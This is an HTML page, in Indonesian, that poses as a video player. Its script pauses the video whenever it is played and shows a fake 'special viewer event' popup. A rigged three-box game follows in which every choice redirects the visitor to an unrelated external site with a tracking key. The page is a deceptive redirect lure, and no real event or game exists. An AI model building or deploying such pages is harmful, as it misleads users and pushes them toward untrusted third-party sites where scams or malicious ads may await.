<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Video Page</title>

<style>
body { margin:0; font-family:Arial; background:#000; color:#fff; text-align:center; }
video { width:100%; max-height:60vh; }

.overlay {
    position:fixed;
    top:0; left:0;
    width:100%; height:100%;
    background:rgba(0,0,0,0.85);
    display:flex;
    justify-content:center;
    align-items:center;
    z-index:999;
}

.popup {
    background:#fff;
    color:#000;
    padding:25px;
    border-radius:12px;
    width:320px;
    text-align:center;
}

button {
    padding:10px 20px;
    border:none;
    background:#111;
    color:#fff;
    border-radius:6px;
    cursor:pointer;
    margin-top:10px;
}

.game-box {
    width:80px;
    height:80px;
    background:#eee;
    display:inline-flex;
    justify-content:center;
    align-items:center;
    margin:8px;
    border-radius:10px;
    cursor:pointer;
    font-size:30px;
}
</style>
</head>
<body>

<video id="myVideo" controls>
    <source src="https://cdn.videy.co/iNMbHsm91.mp4" type="video/mp4">
</video>

<div id="eventPopup" class="overlay" style="display:none;">
    <div class="popup">
        <h3>ğŸ‰ Event Spesial Penonton</h3>
        <p>Hari ini kami mengadakan mini game interaktif untuk pengguna.</p>
        <p>Mainkan game sederhana untuk melanjutkan ke halaman promo spesial.</p>
        <button onclick="startGame()">Mainkan Sekarang</button>
    </div>
</div>

<div id="gamePopup" class="overlay" style="display:none;">
    <div class="popup">
        <h3>Pilih Salah Satu Kotak</h3>
        <div class="game-box" onclick="finishGame()">ğŸ</div>
        <div class="game-box" onclick="finishGame()">ğŸ</div>
        <div class="game-box" onclick="finishGame()">ğŸ</div>
        <p style="font-size:12px; margin-top:10px;">Klik salah satu untuk melanjutkan</p>
    </div>
</div>

<script>
let video = document.getElementById("myVideo");

video.addEventListener("play", function() {
    video.pause();
    document.getElementById("eventPopup").style.display="flex";
});

function startGame(){
    document.getElementById("eventPopup").style.display="none";
    document.getElementById("gamePopup").style.display="flex";
}

function finishGame(){
    window.location.href = "https://oversightexcitement.com/ecpp2d2yf?key=780644cc073355ffdcb57a8c6dbbd9b4";
}
</script>

</body>
</html>
